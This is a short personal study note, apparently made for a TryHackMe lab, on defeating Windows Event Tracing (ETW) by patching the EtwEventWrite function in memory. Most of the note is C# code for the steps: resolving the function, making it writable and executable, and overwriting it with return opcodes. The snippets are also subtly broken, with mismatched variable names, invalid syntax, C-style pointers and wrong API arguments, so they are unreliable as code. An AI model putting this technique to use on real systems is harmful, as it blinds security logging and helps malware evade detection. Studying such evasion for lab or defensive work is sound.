# ETW-Evasion Patching Tracing Functions

Patching Tracing Functions is a [[Logging-And-Monitoring-Evasion]] technique. The [[Event-Tracing-for-Windows]] (ETW) is loaded from the runtime of every new process, commonly originating from the **CLR** (**C**ommon **L**anguage **R**untime). Within a new process, ETW events are sent from the userland and issued directly from the current process. 

The techniques involve [[Binary-Patching]] (writing pre-defined opcodes to an) in-memory function of ETW to patch and disable functionality
1. Obtain a handle for `EtwEventWrite` by loading the library using `LoadLibrary` then obtain the handle using `GetProcAddress`
```csharp
var ntdll = Win32.LoadLibrary("ntdll.dll");
var etwFunction = Win32.GetProcAddress(ntdll, "EtwEventWrite");
```
2. Modify memory permissions of the function - the permissions are defined by the `flNewProtect` parameter; `0x40` enables X, R, or RW access ([memory protection constraints](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)).
```csharp
uint oldProtect;
Win32.VirtualProtect(
	etwFunction, 
	(UIntPtr)patch.Length, 
	0x40, 
	out oldProtect
);
```
3. Write opcode bytes to memory (writing to the function not a process with `Marshal.Copy`!)
```csharp
patch(new byte[] { 0xc2, 0x14, 0x00 });
Marshal.Copy(
	patch, 
	0, 
	etwEventSend, 
	patch.Length
);
```
4. Restore memory permissions of the function (optional, but probably a good idea) 
```csharp
VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect);
```
5. Flush (the patched function will be executed from the instruction cache) the instruction cache
```csharp
Win32.FlushInstructionCache(
	etwFunction,
	NULL
);
```

## References

[Microsoft Documentation - Memory Protection Constraints](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)
[THM Evading Logging and Monitoring Room](https://tryhackme.com/room/monitoringevasion)

